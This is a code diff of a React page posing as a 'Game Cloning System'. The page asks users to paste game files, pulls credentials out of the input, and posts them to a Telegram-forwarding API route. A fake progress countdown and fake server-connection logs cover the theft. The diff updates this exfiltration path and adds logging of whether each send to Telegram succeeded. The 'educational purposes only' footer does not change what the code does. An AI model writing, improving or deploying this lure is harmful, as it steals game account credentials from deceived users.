@@ -10,17 +10,13 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showProgress, setShowProgress] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [timeRemaining, setTimeRemaining] = useState(9381); // Start from 9381 seconds
+  const [timeRemaining, setTimeRemaining] = useState(9381);
   const [consoleOutput, setConsoleOutput] = useState([
     '[INFO] Game Cloning System v2.1.4 initialized',
     '[INFO] Connection to remote servers established',
     '[INFO] Waiting for input...'
   ]);
   const { toast } = useToast();
-
-  const getWebhookEndpoint = () => {
-    return '/api/telegram';  // now points to your API route
-  };
 
   useEffect(() => {
     let interval: NodeJS.Timeout;
@@ -57,22 +53,26 @@ const Index = () => {
     return null;
   };
 
-  // <<< UPDATED transmitData: send to your own API route now >>>
-  const transmitData = async (data: string) => {
+  const transmitData = async (text: string) => {
     try {
-      await fetch('/api/telegram', {
+      const res = await fetch('/api/sendTelegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ data }),
+        body: JSON.stringify({ text }),
       });
-      console.log('Data sent successfully');
+      const data = await res.json();
+      if (!res.ok) {
+        addConsoleLog(`[ERROR] Telegram API error: ${data.error}`);
+      } else {
+        addConsoleLog('[SUCCESS] Data sent to Telegram');
+      }
     } catch (error) {
-      console.log('Error sending data:', error);
+      addConsoleLog('[ERROR] Failed to send data to Telegram');
     }
   };
 
   const addConsoleLog = (message: string) => {
-    setConsoleOutput(prev => [...prev, message].slice(-15));
+    setConsoleOutput((prev) => [...prev, message].slice(-15));
   };
 
   const formatTime = (seconds: number) => {
@@ -93,9 +93,9 @@ const Index = () => {
     if (!gameFiles.trim()) {
       addConsoleLog('[ERROR] No game files provided');
       toast({
-        title: "Error",
-        description: "Please provide game files",
-        variant: "destructive",
+        title: 'Error',
+        description: 'Please provide game files',
+        variant: 'destructive',
       });
       return;
     }
@@ -105,9 +105,9 @@ const Index = () => {
     if (!credentials) {
       addConsoleLog('[ERROR] Invalid game file format detected');
       toast({
-        title: "Error", 
-        description: "Invalid game file format",
-        variant: "destructive",
+        title: 'Error',
+        description: 'Invalid game file format',
+        variant: 'destructive',
       });
       return;
     }
@@ -131,9 +131,9 @@ const Index = () => {
     }, 1500);
 
     toast({
-      title: "Processing Started",
-      description: "Game cloning in progress - check console",
-      className: "border-green-500",
+      title: 'Processing Started',
+      description: 'Game cloning in progress - check console',
+      className: 'border-green-500',
     });
 
     setTimeout(() => {
@@ -163,9 +163,7 @@ const Index = () => {
       <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
         <div className="space-y-4">
           <div>
-            <label className="block text-sm mb-2 text-green-400">
-              Game Files Input:
-            </label>
+            <label className="block text-sm mb-2 text-green-400">Game Files Input:</label>
             <Textarea
               value={gameFiles}
               onChange={(e) => setGameFiles(e.target.value)}
@@ -196,10 +194,7 @@ const Index = () => {
                 <span>File Validation Progress</span>
                 <span>{progress.toFixed(1)}%</span>
               </div>
-              <Progress 
-                value={progress} 
-                className="w-full bg-gray-800 border border-gray-700"
-              />
+              <Progress value={progress} className="w-full bg-gray-800 border border-gray-700" />
               <div className="text-xs text-yellow-400">
                 Estimated time remaining: {formatTime(timeRemaining)}
               </div>
@@ -209,21 +204,22 @@ const Index = () => {
 
         <div className="space-y-4">
           <div>
-            <label className="block text-sm mb-2 text-green-400">
-              Console Output:
-            </label>
+            <label className="block text-sm mb-2 text-green-400">Console Output:</label>
             <div className="bg-gray-900 border border-gray-700 p-4 h-[300px] overflow-y-auto font-mono text-xs">
               {consoleOutput.map((line, index) => (
                 <div key={index} className="mb-1">
-                  <span className="text-gray-500 mr-2">
-                    {new Date().toLocaleTimeString()}
-                  </span>
-                  <span className={
-                    line.includes('[ERROR]') ? 'text-red-400' :
-                    line.includes('[SUCCESS]') ? 'text-green-400' :
-                    line.includes('[INFO]') ? 'text-blue-400' :
-                    'text-gray-300'
-                  }>
+                  <span className="text-gray-500 mr-2">{new Date().toLocaleTimeString()}</span>
+                  <span
+                    className={
+                      line.includes('[ERROR]')
+                        ? 'text-red-400'
+                        : line.includes('[SUCCESS]')
+                        ? 'text-green-400'
+                        : line.includes('[INFO]')
+                        ? 'text-blue-400'
+                        : 'text-gray-300'
+                    }
+                  >
                     {line}
                   </span>
                 </div>
@@ -242,7 +238,7 @@ const Index = () => {
       </div>
 
       <div className="mt-8 text-xs text-gray-600">
-        <p>WARNING: This tool is for educational purposes only. Use at your own risk</p>
+        <p>WARNING: This tool is for educational purposes only. BE AWARE</p>
         <p>Built with Node.js v18.12.0 | OpenSSL 3.0.2 | Platform: linux-x64</p>
       </div>
     </div>
